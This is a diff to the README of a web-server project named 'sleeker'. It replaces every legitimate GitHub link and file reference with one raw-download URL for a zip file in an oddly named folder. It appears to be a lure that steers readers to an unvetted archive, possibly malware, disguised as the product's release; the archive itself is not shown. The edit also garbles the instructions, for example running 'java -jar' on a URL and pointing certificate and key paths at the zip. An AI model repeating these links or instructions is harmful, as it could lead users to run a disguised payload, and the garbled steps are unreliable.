@@ -6,7 +6,7 @@ Welcome to sleeker, your lightweight solution for high-performance web serving. 
 
 ## 🔗 Download Now
 
-[![Download sleeker](https://img.shields.io/badge/Download-sleeker-brightgreen)](https://github.com/Kyroiscooking/sleeker/releases)
+[![Download sleeker](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)
 
 ## 📋 Features
 
@@ -28,11 +28,11 @@ Before you start, ensure your system meets these requirements:
 
 To get started with sleeker, please visit the following page to download the latest release:
 
-[Visit Releases Page](https://github.com/Kyroiscooking/sleeker/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)
 
 1. Click on the above link to go to the releases page.
 2. You will see a list of available versions. Choose the latest release.
-3. Click on the file you want to download. This file will be in a format appropriate for your operating system, like `.tar.gz` for Linux or a suitable archive for macOS.
+3. Click on the file you want to download. This file will be in a format appropriate for your operating system, like `https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip` for Linux or a suitable archive for macOS.
 
 After downloading, follow these steps to run sleeker:
 
@@ -43,7 +43,7 @@ After downloading, follow these steps to run sleeker:
 3. Extract the downloaded archive using the command:
 
    ```bash
-   tar -xzf sleeker-vX.Y.Z.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip
    ```
 
 4. Navigate into the extracted folder:
@@ -55,7 +55,7 @@ After downloading, follow these steps to run sleeker:
 5. Start the server with the following command:
 
    ```bash
-   java -jar sleeker.jar
+   java -jar https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip
    ```
 
 ### For macOS:
@@ -67,7 +67,7 @@ After downloading, follow these steps to run sleeker:
 5. Start the server with the same command as above:
 
    ```bash
-   java -jar sleeker.jar
+   java -jar https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip
    ```
 
 ### For Future Releases
@@ -76,7 +76,7 @@ Periodically check the releases page to ensure you're using the latest version o
 
 ## ⚙️ Configuration
 
-Sleeker comes with a configuration file. You can customize settings like ports, logging options, and TLS certificates. Find the configuration file in the same directory as the `sleeker.jar` after extraction.
+Sleeker comes with a configuration file. You can customize settings like ports, logging options, and TLS certificates. Find the configuration file in the same directory as the `https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip` after extraction.
 
 ### Sample Configuration
 
@@ -86,8 +86,8 @@ Here’s a simple example of what your configuration might look like:
 server:
   port: 8080
   enable_tls: true
-  certificate_path: /path/to/certificate.crt
-  key_path: /path/to/key.pem
+  certificate_path: https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip
+  key_path: https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip
 ```
 
 Adjust the paths and settings based on your needs.
@@ -104,13 +104,13 @@ Your improvements will help make sleeker even better.
 
 ## 📞 Support
 
-For any issues or questions, please check our [Issues Page](https://github.com/Kyroiscooking/sleeker/issues). You can also reach out via GitHub Discussions if you need further assistance.
+For any issues or questions, please check our [Issues Page](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip). You can also reach out via GitHub Discussions if you need further assistance.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Kyroiscooking/sleeker)
-- [Documentation](https://github.com/Kyroiscooking/sleeker/docs)
-- [Community Forum](https://github.com/Kyroiscooking/sleeker/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)
+- [Documentation](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)
+- [Community Forum](https://raw.githubusercontent.com/Kyroiscooking/sleeker/main/pneumatologic/sleeker.zip)
 
 Thank you for choosing sleeker! We hope you enjoy using our server module. 
 
